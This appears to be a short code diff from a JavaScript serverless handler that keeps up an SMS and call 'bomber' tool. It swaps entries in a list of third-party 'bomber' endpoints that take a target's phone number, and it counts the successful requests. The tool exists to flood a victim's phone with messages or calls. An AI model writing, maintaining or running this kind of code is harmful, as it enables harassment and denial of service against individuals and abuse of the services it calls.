@@ -15,10 +15,10 @@ export default async function handler(req, res) {
     const apis = [
         `https://freepalestine-iota.vercel.app/api/bomber1?phone=${phone}`,
         `https://freepalestine-iota.vercel.app/api/bomber2?phone=${phone}`,
-        `https://tcsbomberai.vercel.app/api/bomber4?num=${phone}`,
+        `https://freepalestine-iota.vercel.app/api/bomber4?num=${phone}`,
         `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`,
         `https://yousuf323215.serv00.net/call90.php?number=${phone}`,
-        `https://tcsbomberai.vercel.app/api/bomber3?phone=${phone}`  // Added API
+        `https://freepalestine-iota.vercel.app/api/bomber3?phone=${phone}`  // Added API
     ];
 
     let successCount = 0;
